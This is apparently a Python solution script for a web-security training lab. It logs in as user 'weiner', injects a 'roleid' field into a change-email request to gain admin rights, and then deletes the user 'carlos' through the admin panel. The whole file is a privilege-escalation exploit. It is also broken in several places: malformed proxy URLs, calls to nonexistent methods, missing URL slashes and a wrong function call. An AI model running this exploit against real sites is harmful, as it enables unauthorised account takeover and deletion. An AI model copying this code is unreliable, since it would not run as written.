import sys
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def delete_user(s, url):        
        #Logging in as a user weiner         
        login_url = url + '/login'
        login_data = { 'username':'weiner', 'password':'peter'}
        r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
        res = r.text()
        if "Log out" in res:
                print('(+) Successfully Logged in as a weiner user ')                
                #changing the email id 
                change_email_url = url + 'my-account/change-email '
                data_role_change = { 'email' : 'test@test.ca', 'roleid': '2'}
                r= s.post(change_email_url, json=data_role_change, verify= False, proxies=proxies)
                res = r.text()
                if 'admin' in res:
                    print('(+) Successfully changed the roleid or gained access to the admin panal')
                    #Visit the admin panal and delete the user carlos
                    session_cookies = r.get_dict('session')
                    delete_carlos_url = url + 'admin/delete?username=carlos'
                    cookies ={'session': session_cookies, 'admin': True}
                    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)                    
                    #Successful solving message 
                    if r.status_code == 200:
                        print('(+) Successfully deleted the user from the database ')
                    else:
                        print('(+) Failure to delete the user from the database')
                        sys.exit(-1)     
                else:
                    print('(+) Could not be able to change the roleid or does not gained access to the admin')
                    sys.exit(-1)                
        else:
            print('(+) Failed to log in as a weiner user')
        
def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    delete_user(url)

if __name__ == '__main__':
    main()